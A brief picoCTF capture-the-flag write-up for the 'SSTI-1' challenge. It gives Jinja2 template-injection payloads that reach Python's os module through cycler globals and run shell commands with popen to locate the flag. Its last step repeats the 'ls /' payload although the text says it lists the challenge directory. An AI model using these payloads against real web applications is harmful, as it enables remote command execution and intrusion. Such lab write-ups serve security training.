#SSTI-1
**Category**: exploitation  
**Difficulty**: Easy  
**Platform**: picoCTF  
**Points**: 100

#Validate Server-Side Template Injection(identify injection point)

#Jinja2 SSTI

Use {{7*7}} to validate

#craft payload

import is banned, so we use cycler.__init__.__globals__to get module 'os'

{{cycler.__init__.__globals__['os']}}

#Exploit

With 'os' module, we use popen to open cmd and run 'ls' to find the repo and related file

{{cycler.__init__.__globals__['os'].popen('ls /').read()}}

Find the repo 'challenge', then open challenge and list the file, the find flag

{{cycler.__init__.__globals__['os'].popen('ls /').read()}}